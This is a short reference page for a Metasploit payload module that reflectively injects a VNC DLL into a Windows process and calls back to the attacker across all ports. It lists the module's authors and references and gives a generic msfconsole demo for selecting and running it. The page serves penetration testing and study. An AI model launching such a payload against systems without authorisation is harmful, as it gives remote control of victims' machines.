## VNC Server (Reflective Injection), Reverse All-Port TCP Stager

Inject a VNC Dll via a reflective loader (staged). Try to 
connect back to the attacker, on all possible ports 
(1-65535, slowly)


## Module Name
payload/windows/vncinject/reverse_tcp_allports

## Authors
* sf
* hdm
* skape


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/vncinject/reverse_tcp_allports
msf payload(reverse_tcp_allports) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_allports) > set TARGET <target-id>
msf payload(reverse_tcp_allports) > show options
   ... show and set options ...
msf payload(reverse_tcp_allports) > run
```
    
    